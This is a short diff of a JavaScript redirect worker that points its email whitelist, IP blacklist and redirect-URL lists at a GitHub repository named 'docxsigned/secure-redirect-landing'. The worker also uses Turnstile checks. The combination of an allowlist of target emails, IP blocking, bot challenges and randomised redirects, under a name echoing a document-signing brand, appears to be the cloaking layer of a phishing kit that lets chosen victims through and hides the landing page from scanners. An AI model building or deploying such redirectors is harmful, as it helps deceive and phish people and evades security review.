@@ -247,7 +247,7 @@ async function verifyTurnstile(token, clientIP) {
 async function getWhitelist() {
   try {
     // In production, fetch from your GitHub repo
-    const response = await fetch('https://raw.githubusercontent.com/yourusername/yourrepo/main/list.json');
+    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/list.json');
     const data = await response.json();
     return data.emails || [];
   } catch (error) {
@@ -259,7 +259,7 @@ async function getWhitelist() {
 async function getBlacklist() {
   try {
     // In production, fetch from your GitHub repo
-    const response = await fetch('https://raw.githubusercontent.com/yourusername/yourrepo/main/blacklist.txt');
+    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/blacklist.txt');
     const text = await response.text();
     return text.split('\n').filter(ip => ip.trim() !== '');
   } catch (error) {
@@ -271,7 +271,7 @@ async function getBlacklist() {
 async function getRandomRedirectUrl() {
   try {
     // In production, fetch from your GitHub repo
-    const response = await fetch('https://raw.githubusercontent.com/yourusername/yourrepo/main/url.json');
+    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/url.json');
     const data = await response.json();
     const urls = data.urls || [];
     
@@ -486,7 +486,7 @@ async function verifyTurnstileEnhanced(token, clientIP, difficulty) {
 // Real-time configuration from GitHub
 async function getWhitelistRealTime() {
   try {
-    const response = await fetch('https://raw.githubusercontent.com/yourusername/yourrepo/main/list.json', {
+    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/list.json', {
       headers: {
         'Cache-Control': 'no-cache',
         'Pragma': 'no-cache'
@@ -502,7 +502,7 @@ async function getWhitelistRealTime() {
 
 async function getRandomRedirectUrlRealTime() {
   try {
-    const response = await fetch('https://raw.githubusercontent.com/yourusername/yourrepo/main/url.json', {
+    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/url.json', {
       headers: {
         'Cache-Control': 'no-cache',
         'Pragma': 'no-cache'
